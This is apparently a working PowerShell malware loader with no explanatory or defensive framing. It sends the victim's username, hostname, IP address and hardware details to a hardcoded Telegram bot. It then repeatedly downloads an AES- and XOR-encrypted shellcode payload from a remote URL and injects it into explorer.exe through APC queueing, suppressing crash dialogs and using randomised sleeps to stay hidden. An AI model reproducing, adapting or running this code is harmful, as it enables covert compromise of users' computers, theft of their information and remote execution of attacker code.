$group = "DefaultGroup"

function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    Write-Host $logMessage
}

function Send-TelegramNotify {
    try {
        $username = $env:USERNAME
        $computerName = $env:COMPUTERNAME
        $cpu = try { (Get-CimInstance Win32_Processor).Name.Trim() } catch { "Unknown" }
        $gpu = try { (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name.Trim() } catch { "Unknown" }
        $ram = try {
            $totalBytes = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
            "{0:N2} GB" -f ($totalBytes / 1GB)
        } catch { "Unknown" }
      
        $ip = try {
            (Invoke-RestMethod -Uri "https://api.ipify.org/?format=json" -TimeoutSec 5).ip
        } catch {
            try {
                (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' } | Select-Object -First 1).IPAddress
            } catch { "Unknown" }
        }
      
        $os = [System.Environment]::OSVersion.VersionString
      
        $msg = @"
[+] DONE
User: $username
Host: $computerName
OS: $os
IP: $ip
CPU: $cpu
GPU: $gpu
RAM: $ram
Group: $group
Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@
      
        $bot = "7252153973:AAHhnvXQn4Q5DJTEtLiA7y59VCkJEdEFoak"
        $chat = "-1002513798195"
        $uri = "https://api.telegram.org/bot$bot/sendMessage"
        $body = @{
            chat_id = $chat
            text = $msg
            disable_notification = $true
        }
      
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -TimeoutSec 10 | Out-Null
    } catch {}
}

Send-TelegramNotify

while ($true) {
    try {
        # === SUPPRESS CRASH DIALOGS (prevents "explorer.exe has stopped" popups) ===
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class ApcHelper {
    [DllImport("kernel32.dll")] public static extern uint SetErrorMode(uint uMode);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, int size, out IntPtr written);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
    [DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
}
"@ -ErrorAction SilentlyContinue

        [ApcHelper]::SetErrorMode(0x8001) | Out-Null

        # === GET EXPLORER ===
        $explorer = Get-Process explorer -ErrorAction SilentlyContinue
        if (-not $explorer) {
            Start-Sleep -Seconds 10
            continue
        }

        # === DOWNLOAD AND DECRYPT (unchanged from original) ===
        $url = "https://bvmatqnam.com.vn/js/pp10.bin"
        $xorKey = 0x5A
        $aesPassword = "S3cur3Passphras3!"
        $enc = $null
        for ($attempt = 1; $attempt -le 3; $attempt++) {
            try {
                $enc = (Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 30 -Headers @{"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}).Content
                break
            } catch {
                Start-Sleep -Seconds (5 * $attempt)
            }
        }
        if (-not $enc) {
            Start-Sleep -Seconds 60
            continue
        }

        $key = [Text.Encoding]::UTF8.GetBytes($aesPassword.PadRight(32, "X").Substring(0,32))
        $iv = $enc[0..15]
        $cipher = $enc[16..($enc.Length - 1)]
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = 'CBC'
        $aes.Padding = 'PKCS7'
        $decryptor = $aes.CreateDecryptor()
        $xorData = $decryptor.TransformFinalBlock($cipher, 0, $cipher.Length)
        $shellcode = [byte[]]::new($xorData.Length)
        for ($i = 0; $i -lt $xorData.Length; $i++) {
            $shellcode[$i] = $xorData[$i] -bxor $xorKey
        }

        if ($shellcode.Length -lt 200) {
            Start-Sleep -Seconds 60
            continue
        }

        # === INJECT INTO EXPLORER (APC ONLY) ===
        $hProc = [ApcHelper]::OpenProcess(0x1F0FFF, $false, $explorer.Id)
        if ($hProc -eq [IntPtr]::Zero) { throw "Failed to open explorer.exe" }

        $addr = [ApcHelper]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint32]$shellcode.Length, 0x3000, 0x40)
        if ($addr -eq [IntPtr]::Zero) { throw "VirtualAllocEx failed" }

        $written = [IntPtr]::Zero
        [ApcHelper]::WriteProcessMemory($hProc, $addr, $shellcode, $shellcode.Length, [ref]$written) | Out-Null

        # === SAFE THREAD SELECTION (THE FIX) ===
        # Only select threads that are in an alertable wait state (WaitReason = UserRequest)
        # This prevents freezing because APC can actually execute on these threads.
        $threads = $explorer.Threads | Where-Object {
            $_.ThreadState -eq 'Wait' -and
            $_.WaitReason -eq 'UserRequest'
        } | Select-Object -First 3

        # If no alertable threads exist, we skip injection to avoid crashing explorer.
        if (-not $threads) {
            Write-Host "No alertable threads found - skipping injection this cycle" -ForegroundColor Yellow
            [ApcHelper]::CloseHandle($hProc)
            Start-Sleep -Seconds 60
            continue
        }

        $successCount = 0
        foreach ($t in $threads) {
            $hThread = [ApcHelper]::OpenThread(0x0010, $false, $t.Id)
            if ($hThread -ne [IntPtr]::Zero) {
                $result = [ApcHelper]::QueueUserAPC($addr, $hThread, [IntPtr]::Zero)
                if ($result -ne 0) { $successCount++ }
                [ApcHelper]::CloseHandle($hThread)
            }
        }

        [ApcHelper]::CloseHandle($hProc)

        # Optional: log success
        if ($successCount -gt 0) {
            Write-Host "APC injection successful on $successCount thread(s)" -ForegroundColor Green
        }

    } catch {
        # Silent fail – no crash dialogs, just log
        Write-Host "Error: $_" -ForegroundColor Red
    }

    $sleepTime = 240 + (Get-Random -Minimum -60 -Maximum 120)
    Start-Sleep -Seconds $sleepTime

}

